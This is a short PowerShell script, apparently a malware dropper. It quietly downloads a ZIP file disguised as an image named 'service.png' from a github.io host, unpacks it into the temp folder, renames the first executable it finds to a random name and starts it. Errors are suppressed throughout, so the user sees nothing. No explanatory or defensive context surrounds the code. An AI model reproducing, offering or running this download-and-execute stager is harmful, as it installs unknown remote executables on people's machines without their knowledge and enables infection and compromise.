$ProgressPreference='SilentlyContinue'
try{Add-Type -AssemblyName System.IO.Compression.FileSystem}catch{}
$b=[System.Guid]::NewGuid().ToString('N').Substring(0,11)
$zippath="$env:TEMP\$b.zip"
$outputf="$env:TEMP\$b"
try{(New-Object System.Net.WebClient).DownloadFile('https://fa-9.github.io/cdn/service.png',$zippath)}catch{}
if(Test-Path $zippath){[System.IO.Compression.ZipFile]::ExtractToDirectory($zippath,$outputf)}
$r=Get-ChildItem $outputf -Filter *.exe -ErrorAction SilentlyContinue|Select-Object -First 1
if($r){$n="$outputf\$([System.Guid]::NewGuid().ToString('N').Substring(0,8)).exe";Move-Item $r.FullName $n;[System.Diagnostics.Process]::Start($n)}